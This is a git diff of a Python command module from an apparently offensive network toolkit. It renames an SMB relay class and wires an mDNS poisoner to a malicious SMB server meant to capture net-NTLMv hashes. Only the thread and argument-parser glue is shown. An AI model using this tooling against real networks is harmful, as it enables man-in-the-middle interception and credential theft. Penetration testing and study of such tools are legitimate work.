@@ -2,14 +2,14 @@ from cmd2.command_definition import with_default_category
 from cmd2 import CommandSet, with_default_category, Cmd2ArgumentParser, with_argparser
 import argparse
 
-from project.RelayAttacks.servers.smbserver import MaliciousSmbServer
+from .servers.smbserver import MaliciousSmbServer
 from .Poison import MDNS
 from multiprocessing import Process
 from threading import Thread
 
 
-@with_default_category("Relay Attacks")
-class SmbRelay(CommandSet):
+@with_default_category("Man in the middle attacks")
+class SmbServerAttack(CommandSet):
     """[ Class containing smbrelay attack ]"""
 
     def __init__(self) -> None:
@@ -17,7 +17,7 @@ class SmbRelay(CommandSet):
         super().__init__()
 
     def config_poison_and_server(
-        self, mdns_poisoner: MDNS, smbserver: SmbServer
+        self, mdns_poisoner: MDNS, smbserver: MaliciousSmbServer
     ) -> None:
         """[ Function to launch the threads that will control the mdns poisoner and the smb server]
 
@@ -30,7 +30,7 @@ class SmbRelay(CommandSet):
         mdns_thread.daemon = True
 
         self._cmd.poutput("Starting smb server")
-        smbserver_thread = Thread(target=smbserver.start_smbserver)
+        smbserver_thread = Thread(target=smbserver.start_malicious_smbserver)
         smbserver_thread.daemon = True
 
         mdns_thread.start()
@@ -40,7 +40,7 @@ class SmbRelay(CommandSet):
         smbserver_thread.join()
 
     argParser = Cmd2ArgumentParser(
-        description="""Tool to perform the smb_relay attack attack"""
+        description="""Malicious smb server attack to get hashes net-NTLMV """
     )
     argParser.add_argument(
         "-SS",
@@ -50,7 +50,7 @@ class SmbRelay(CommandSet):
     )
 
     @with_argparser(argParser)
-    def do_smb_relay(self, args: argparse.Namespace) -> None:
+    def do_mss(self, args: argparse.Namespace) -> None:
         """[ Command to perform smb_relay ]
 
         Args:
